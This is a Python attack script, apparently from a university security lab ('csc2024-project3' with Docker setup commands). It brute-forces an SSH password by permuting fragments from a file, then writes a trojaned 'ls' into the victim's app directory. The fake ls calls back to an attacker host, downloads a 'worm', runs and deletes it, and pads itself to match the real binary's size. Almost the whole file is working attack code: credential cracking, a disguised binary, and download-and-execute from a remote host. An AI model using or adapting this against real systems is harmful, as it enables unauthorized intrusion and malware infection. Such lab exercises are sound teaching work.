#!/usr/bin/env python3
import itertools
import paramiko
import socket
import sys

def ssh(vic_ip, vic_user, vic_passwd):
    connection = paramiko.SSHClient()
    connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        connection.connect(hostname=vic_ip, username=vic_user, password=vic_passwd, timeout=1)
        print(f'[+] Successfully connected to {vic_ip} with {vic_user}:{vic_passwd}')
        return connection
    except (paramiko.AuthenticationException, socket.error):
        return None
    except paramiko.SSHException:
        print(f'[-] SSH exception with {vic_passwd}')
        return ssh(vic_ip, vic_user, vic_passwd)
    
def task1(vic_ip, vic_user):
    dat_file = open('victim.dat', 'r')
    frag_str = dat_file.read().splitlines()

    for plen in range(1, len(frag_str)+1):
        for comb in itertools.permutations(frag_str, plen):
            passwd = ''.join(comb)
            connection = ssh(vic_ip, vic_user, passwd)
            if connection:
                return connection

virus_payload1 = '''
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host_ip, host_port))

while True:
    s.send("victim".encode())
    worm = s.recv(2048)
    break

f = open("worm", "w")
f.write(worm.decode())
f.close()
'''

virus_payload2 = '''
chmod +x worm
./worm
rm worm
ls
'''

# init folder: /home/csc2024
def task2(connection, att_ip, att_port):
    _stdin, stdout, stderr = connection.exec_command("echo \"#!/usr/bin/env bash\" > ../../app/ls")
    _stdin, stdout, stderr = connection.exec_command("echo \"python3 - <<EOF\" >> ../../app/ls")
    _stdin, stdout, stderr = connection.exec_command("echo \'host_ip   = \"" + attacker_ip + "\"\' >> ../../app/ls")
    _stdin, stdout, stderr = connection.exec_command("echo \'host_port = " + attacker_port + "\' >> ../../app/ls")
    _stdin, stdout, stderr = connection.exec_command("echo \'" + virus_payload1 + "\' >> ../../app/ls")
    _stdin, stdout, stderr = connection.exec_command("echo \"EOF\" >> ../../app/ls")
    _stdin, stdout, stderr = connection.exec_command("echo \'" + virus_payload2 + "\' >> ../../app/ls")

    _stdin, stdout, stderr = connection.exec_command("ls -l ~/../../bin/ls | awk {'print $5'}")
    ls_byte = stdout.read().decode()

    _stdin, stdout, stderr = connection.exec_command("ls -l ../../app/ls | awk {'print $5'}")
    virus_byte = stdout.read().decode()

    padding_size = int(ls_byte) - int(virus_byte) - 9
    _stdin, stdout, stderr = connection.exec_command("dd if=/dev/zero bs=" + str(padding_size) + " count=1 >> ../../app/ls")
    _stdin, stdout, stderr = connection.exec_command("echo -n \"#aabbccdd\" >> ../../app/ls")
    _stdin, stdout, stderr = connection.exec_command("chmod +x ../../app/ls")

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print('Usage: python3 crack_attack.py <victim_ip> <attacker_ip> <attacker_port>')
        sys.exit(1)

    victim_ip   = sys.argv[1]
    victim_user = 'csc2024'

    attacker_ip   = sys.argv[2]
    attacker_port = sys.argv[3]

    connection = task1(victim_ip, victim_user)
    task2(connection, attacker_ip, attacker_port)

# sudo docker build -t csc2024-project3 -f csc2024-project3.Dockerfile .
# sudo docker compose -f csc2024-project3-docker-compose.yml up -d
# sudo docker compose -f csc2024-project3-docker-compose.yml down

# docker exec -it attacker bash
# docker exec -it victim bash

# python3 crack_attack.py  172.18.0.3 172.18.0.2 7777
# python3 attack_server.py 7777